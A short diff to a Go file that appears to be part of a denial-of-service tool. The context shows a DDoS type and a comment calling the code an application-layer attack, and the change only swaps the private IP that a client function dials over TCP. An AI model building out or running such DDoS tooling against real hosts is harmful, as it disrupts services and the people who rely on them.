@@ -76,7 +76,7 @@ func (d *DDoS) Stop() {
 // The above is an application layer attack
 
 func startClient()error{
-	host := "192.168.1.97"
+	host := "192.168.6.97"
 	port := 12348
 
 	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
